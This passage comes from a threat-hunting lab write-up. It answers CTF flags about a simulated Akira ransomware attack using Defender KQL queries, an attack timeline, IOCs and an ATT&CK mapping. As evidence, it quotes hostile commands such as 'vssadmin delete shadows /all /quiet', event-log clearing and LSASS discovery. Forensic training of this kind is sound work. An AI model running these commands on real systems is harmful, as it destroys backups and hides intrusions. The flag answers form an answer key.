**Answer:** *(Retrieved via DeviceFileEvents on as-srv for C:\ProgramData\updater.exe)*
**Table:** `DeviceFileEvents`

#### How It Was Found

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-27T22:00:00Z) .. datetime(2026-01-27T22:30:00Z))
| where DeviceName == "as-srv"
| where FileName == "updater.exe"
| where FolderPath has "ProgramData"
| project TimeGenerated, FileName, FolderPath, ActionType, SHA256
| sort by TimeGenerated asc
```

#### Logic & Reasoning

The malicious `updater.exe` hash is distinct from the legitimate Google Updater binary. Per challenge instructions, this hash was not uploaded to VirusTotal.

---

### Flag 35 — IMPACT: Ransomware Staging Process

**Question:** What process staged the ransomware on AS-SRV?
**Answer:** `powershell.exe`
**Table:** `DeviceFileEvents`

#### How It Was Found

Confirmed from `DeviceFileEvents` — `C:\ProgramData\updater.exe` was created with `InitiatingProcessCommandLine: "powershell.exe"` at `10:15 PM`, consistent with the attacker running PowerShell interactively via AnyDesk.

#### Logic & Reasoning

The bare `"powershell.exe"` initiating process (no arguments) indicates an interactive PowerShell session — the attacker was operating hands-on-keyboard via AnyDesk on `as-srv`. The `Explorer.EXE`-launched PowerShell at `10:14 PM` and `10:16 PM` confirms the attacker used the AnyDesk GUI session to open PowerShell and manually drop and execute the ransomware.

---

### Flag 36 — IMPACT: Recovery Prevention

**Question:** What command was used to delete backup copies?
**Answer:** `vssadmin delete shadows /all /quiet`
**Table:** `DeviceProcessEvents`, MDE Alert

#### How It Was Found

Visible in the MDE alert process tree: `cmd.exe attempted to delete volume shadow copies`. Confirmed the exact command via `DeviceProcessEvents`.

#### Logic & Reasoning

Volume Shadow Copy Service (VSS) snapshots are Windows' built-in backup mechanism. Deleting them with `/all /quiet` prevents recovery without external backups. This is standard ransomware pre-encryption procedure and was executed at `4:03:49 PM` (local) via `kill.bat` — after Defender was disabled but before `updater.exe` ran. MDE flagged this as T1490 (Inhibit System Recovery).

**Reference:** [T1490 — Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)

---

### Flag 37 — IMPACT: Ransom Note Origin

**Question:** What process dropped the ransom note?
**Answer:** `updater.exe`
**Table:** `DeviceFileEvents`

#### How It Was Found

Confirmed from `DeviceFileEvents` on `as-srv` — `updater.exe` created `akira_readme.txt` in multiple locations at `10:18:33 PM`, confirmed from earlier file event queries.

#### Logic & Reasoning

Ransomware binaries typically drop their ransom note into every directory they encrypt. `updater.exe` created `akira_readme.txt` across multiple share subdirectories simultaneously at `10:18:33 PM`, confirming this timestamp as the start of encryption. The note was also placed at `C:\Users\Public\Desktop\` for maximum visibility.

---

### Flag 38 — IMPACT: Encryption Start

**Question:** What time was the ransom note dropped? (UTC)
**Answer:** `22:18:33`
**Table:** `DeviceFileEvents`

#### How It Was Found

From the `DeviceFileEvents` results showing `updater.exe` creating `akira_readme.txt` with the earliest timestamp of `2026-01-27T22:18:33.372Z` UTC.

#### Logic & Reasoning

The ransom note drop timestamp marks the beginning of encryption — `updater.exe` writes the note before or as it begins encrypting directories. The MDE UI displayed this as `5:18 PM` local time, but the UTC value `22:18:33` was confirmed directly from the KQL query results. All encrypted folders in `C:\Shares\` showed `Date modified: 1/27/2026 10:18 PM` matching this timestamp.

---

### Section 12: Anti-Forensics & Scope

---

### Flag 39 — ANTI-FORENSICS: Cleanup Script

**Question:** What script deleted the ransomware?
**Answer:** `clean.bat`
**Table:** `DeviceFileEvents`

#### How It Was Found

Confirmed from `DeviceFileEvents` — `C:\ProgramData\updater.exe` was deleted at `10:20:28 PM` with `InitiatingProcessCommandLine: "cmd.exe" /c C:\ProgramData\clean.bat`.

#### Logic & Reasoning

`clean.bat` ran 2 minutes after encryption completed, deleting `updater.exe` and wiping additional event logs (`Windows PowerShell`, `Microsoft-Windows-PowerShell/Operational`, `Microsoft-Windows-PowerShell/Admin`). Combined with `updater.exe`'s own `wevtutil` log clearing of 5 logs immediately post-encryption, the attacker made two passes of anti-forensics. `clean.bat` was itself deleted after execution, leaving minimal evidence of the cleanup mechanism.

**Reference:** [T1070.001 — Indicator Removal: Clear Windows Event Logs](https://attack.mitre.org/techniques/T1070/001/)

---

### Flag 40 — SCOPE: Affected Hosts

**Question:** What hosts were compromised?
**Answer:** `as-pc2, as-srv`
**Table:** Multiple

#### How It Was Found

Confirmed across all queries throughout the investigation. Additional hosts (`as-pc1`, `ciko-vm`, `takato1`) showed lateral authentication or Tor browser activity but were not confirmed as fully compromised.

#### Logic & Reasoning

`as-pc2` was the initial beachhead where AnyDesk was pre-staged, `wsync.exe` operated as C2, Defender was disabled, and LSASS was dumped. `as-srv` was the target file server where Akira ransomware was deployed, all shares were encrypted, data was exfiltrated, and log clearing occurred. The two-host scope reflects a targeted affiliate attack focused on maximum data impact with minimal lateral spread.

---

## 🗺️ Full Attack Timeline

```
2026-01-27 (UTC)
─────────────────────────────────────────────────────────────────────
18:22  — wsync.exe (v1) dropped to C:\ProgramData\ via IWR          [Persistence]
18:44  — wsync.exe (v2) replacement deployed                         [Persistence]
19:15  — AnyDesk.exe running from C:\Users\Public\ on as-pc2        [Pre-staged Access]
20:14  — bitsadmin download attempts (multiple failures)             [Tool Transfer]
20:17  — scan.exe downloaded via Invoke-WebRequest                   [Tool Transfer]
20:17  — Advanced IP Scanner executed across subnet                  [Discovery]
20:22  — wsync.exe downloaded via Invoke-WebRequest                  [Tool Transfer]
21:02  — kill.bat created by wsync.exe at C:\ProgramData\           [Defence Evasion]
21:03  — kill.bat executed → Defender fully disabled                 [Defence Evasion]
21:03  — DisableAntiSpyware registry key set                        [Defence Evasion]
21:11  — tasklist | findstr lsass (x2) via wsync.exe                [Discovery]
21:42  — \Device\NamedPipe\lsass accessed                           [Credential Access]
21:45  — powershell.exe reads LSASS memory                          [Credential Access]
22:08  — AnyDesk connects to as-srv via relay server                [Lateral Movement]
22:13  — RuntimeBroker.exe beacons to sync.cloud-endpoint.net       [C2]
22:15  — updater.exe (Akira) dropped to C:\ProgramData\ on as-srv   [Staging]
22:16  — SMB enumeration of as-srv shares                           [Discovery]
22:18  — updater.exe executes → encryption begins                   [Impact]
22:18  — akira_readme.txt dropped across all share directories      [Impact]
22:18  — wevtutil clears 5 event logs                               [Anti-Forensics]
22:20  — clean.bat deletes updater.exe + clears 3 more logs         [Anti-Forensics]
22:24  — exfil_data.zip created by st.exe at C:\Users\Public\       [Collection]
```

---

## 🛡️ IOC Summary

| Type | Value | Context |
|---|---|---|
| Attacker External IP | `88.97.164.155` | AnyDesk P2P source |
| C2 Domain | `sync.cloud-endpoint.net` | Payload delivery + C2 |
| C2 Domain | `cdn.cloud-endpoint.net` | Ransomware staging |
| C2 IP | `172.67.174.46` | Resolves sync.cloud-endpoint.net |
| C2 IP | `104.21.30.237` | Resolves cdn.cloud-endpoint.net |
| AnyDesk Relay | `relay-0b975d23.net.anydesk.com` | Remote access relay |
| TOR Address | `akiral2iz6a7qgd3ayp3l6yub7xx2uep76idk3u2kollpj5z3z636bad.onion` | Negotiation portal |
| Compromised Account | `David.Mitchell` | as-pc2 user |
| Lateral Account | `as.srv.administrator` | as-srv local admin via AnyDesk |
| C2 Implant | `C:\ProgramData\wsync.exe` | Beacon (v1 hash: `66b876c5...`) |
| C2 Implant v2 | `C:\ProgramData\wsync.exe` | Beacon (v2 hash: `0072ca0d...`) |
| Scanner | `C:\Users\david.mitchell\Downloads\scan.exe` | Renamed Advanced IP Scanner |
| Evasion Script | `C:\ProgramData\kill.bat` | Defender kill + VSS deletion |
| Cleanup Script | `C:\ProgramData\clean.bat` | Ransomware + log deletion |
| Ransomware | `C:\ProgramData\updater.exe` | Akira payload on as-srv |
| Staging Tool | `st.exe` | Archive utility, hash: `512a1f4e...` |
| Exfil Archive | `C:\Users\Public\exfil_data.zip` | Compressed stolen data |
| Ransom Note | `akira_readme.txt` | Dropped across all share dirs |
| Victim ID | `813R-QWJM-XKIJ` | Akira negotiation ID |
| Encrypted Extension | `.akira` | Appended to all encrypted files |

---

## 🔧 MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Initial Access | Valid Accounts | T1078 | Pre-staged `david.mitchell` credentials from The Broker |
| Persistence | Remote Access Software | T1219 | `AnyDesk.exe` at `C:\Users\Public\` auto-started via `sihost.exe` |
| Persistence | Boot/Logon Autostart Execution | T1547 | AnyDesk launched with user shell session |
| Execution | Command and Scripting: PowerShell | T1059.001 | Bare `powershell.exe` used for all staging on as-srv |
| Execution | User Execution: Malicious File | T1204.002 | `akira_readme.lnk` opened by administrator |
| Defence Evasion | Masquerading: Match Legitimate Name | T1036.005 | `wsync.exe`, `updater.exe` mimicking system processes |
| Defence Evasion | Impair Defenses: Disable/Modify Tools | T1562.001 | `kill.bat` + `DisableAntiSpyware` registry key |
| Defence Evasion | Indicator Removal: Clear Event Logs | T1070.001 | `wevtutil cl` + `clean.bat` wiping 8 log channels |
| Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 | `\Device\NamedPipe\lsass` + powershell LSASS read |
| Discovery | Network Service Discovery | T1046 | `scan.exe` (Advanced IP Scanner) across subnets |
| Discovery | Process Discovery | T1057 | `tasklist | findstr lsass` via `wsync.exe` |
| Discovery | Network Share Discovery | T1135 | SMB enumeration of `as-srv` shares |
| Lateral Movement | Remote Services: SMB | T1021.002 | `david.mitchell` → `as-srv` via port 445 |
| Lateral Movement | Remote Access Software | T1219 | AnyDesk `as.srv.administrator` session on as-srv |
| Collection | Archive Collected Data: Archive via Utility | T1560.001 | `st.exe` → `exfil_data.zip` at `C:\Users\Public\` |
| Command & Control | Ingress Tool Transfer | T1105 | `bitsadmin` + `Invoke-WebRequest` from `sync.cloud-endpoint.net` |
| Command & Control | Encrypted Channel | T1573 | HTTPS C2 beaconing to `sync.cloud-endpoint.net` |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | `exfil_data.zip` staged for upload |
| Impact | Data Encrypted for Impact | T1486 | Akira `updater.exe` encrypted all `C:\Shares\` contents |
| Impact | Inhibit System Recovery | T1490 | `vssadmin delete shadows /all /quiet` |

---

*Writeup by: Alejandro Castillo | Platform: Microsoft Defender for Endpoint | Series: Ashford Sterling Recruitment*
